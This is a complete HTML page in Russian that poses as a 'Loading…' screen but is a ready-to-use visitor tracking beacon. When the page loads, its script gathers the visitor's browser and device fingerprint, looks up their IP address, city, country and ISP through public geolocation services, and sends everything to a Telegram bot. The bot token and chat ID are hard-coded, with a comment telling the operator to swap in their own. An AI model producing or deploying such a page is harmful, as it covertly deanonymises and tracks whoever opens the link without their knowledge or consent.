<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Загрузка…</title>
<style>
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
       background:#0e0e10;color:#9aa0a6;font:14px/1.5 ui-monospace,monospace}
  #s{white-space:pre-wrap;padding:1em;max-width:90vw}
</style>
</head>
<body>
<pre id="s">старт…</pre>

<script>
/* ====== МЕНЯЙ ТОЛЬКО ЭТИ ДВЕ СТРОКИ ====== */
const BOT_TOKEN = "8989141650:AAFBGRMzK6D_7yqVGiinhRR1VHK7Q65ATKY";   // ← из @BotFather
const CHAT_ID   = "8989141650";           // ← из @userinfobot / getUpdates
/* ========================================= */

const log = m => document.getElementById("s").textContent += "\n" + m;

const info = {
  ua:       navigator.userAgent,
  platform: navigator.platform,
  lang:     navigator.language,
  langs:    navigator.languages,
  cores:    navigator.hardwareConcurrency || null,
  mem:      navigator.deviceMemory || null,
  dpr:      window.devicePixelRatio,
  screen:   screen.width + "x" + screen.height,
  avail:    screen.availWidth + "x" + screen.availHeight,
  tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
  tzOffset: new Date().getTimezoneOffset(),
  touch:    navigator.maxTouchPoints || 0,
  conn: navigator.connection ? {
          type: navigator.connection.effectiveType,
          down: navigator.connection.downlink,
          rtt:  navigator.connection.rtt
        } : null,
  battery:  null,
  ts:       new Date().toISOString(),
};

if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    info.battery = { level: Math.round(b.level * 100) + "%", charging: b.charging };
  }).catch(()=>{});
}

async function geo() {
  const endpoints = ["https://ipapi.co/json/", "https://ipwho.is/"];
  for (const url of endpoints) {
    try {
      const r = await fetch(url, {cache: "no-store"});
      const j = await r.json();
      return {
        ip:      j.ip,
        city:    j.city,
        region:  j.region || j.region_name,
        country: j.country_name || j.country,
        org:     j.org || (j.connection && j.connection.org),
        asn:     j.asn || (j.connection && j.connection.asn),
      };
    } catch (e) { log("geo try fail: " + url); }
  }
  return {ip: null};
}

async function send(payload) {
  const text = "📡 beacon\n```\n" + JSON.stringify(payload, null, 2) + "\n```";
  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode: "Markdown"})
  });
  const j = await r.json();
  if (!j.ok) throw new Error("TG: " + JSON.stringify(j));
  return j;
}

(async () => {
  log("geo…");
  try {
    const g = await geo();
    log("geo ok: " + JSON.stringify(g));
    Object.assign(info, g);
  } catch (e) { log("geo FAIL: " + e.message); }

  log("send…");
  try {
    await send(info);
    log("✅ send ok");
  } catch (e) { log("❌ send FAIL: " + e.message); }
})();
</script>
</body>
</html>
